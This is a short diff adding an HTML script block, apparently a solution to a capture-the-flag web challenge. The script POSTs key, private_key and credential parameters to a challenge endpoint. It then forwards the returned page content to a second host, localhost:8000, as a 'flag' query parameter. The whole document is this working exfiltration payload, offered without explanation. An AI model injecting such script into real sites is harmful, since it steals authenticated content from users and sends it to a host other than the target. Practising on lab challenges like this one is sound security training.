@@ -1,0 +1,8 @@
+<!-- Post request using javascript fetching-->
+<script>
+        const params = new URLSearchParams();
+        params.append('key','vtlayice');
+        params.append('private_key','ffzdxswv');
+        params.append('credential','eotmzbap'); 
+        fetch('http://challenge.localhost:80/mission', {'method': 'POST', 'body':params}).then(response => response.text()).then(website_content => fetch(`http://localhost:8000/?flag=${website_content}`))
+</script>
